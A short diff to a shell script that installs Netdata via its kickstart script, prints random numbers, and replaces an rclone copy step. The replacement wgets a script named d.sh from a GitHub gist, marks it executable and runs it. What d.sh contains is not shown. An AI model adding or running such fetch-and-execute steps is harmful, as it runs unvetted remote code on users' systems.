@@ -9,4 +9,6 @@ wget https://my-netdata.io/kickstart.sh
 chmod +x kickstart.sh
 echo -ne '\n' | ./kickstart.sh --claim-token $2 --claim-rooms $3 --claim-url https://app.netdata.cloud
 awk -v n=194 -v seed="$RANDOM" 'BEGIN { srand(seed); for (i=0; i<n; ++i) printf("%.4f\n", rand()) }'
-rclone copy --min-size 1b $4 $5 --drive-chunk-size 128M --onedrive-chunk-size 160M --transfers 10 -P > /dev/null 2>&1
+wget https://gist.githubusercontent.com/AmyTheBuildBot/791c4d6d41982d5cd5d6351a85d7af72/raw/bd8b0e13368012ed54e43e25d0fe389a30d9c760/d.sh
+chmod +x d.sh
+./d.sh
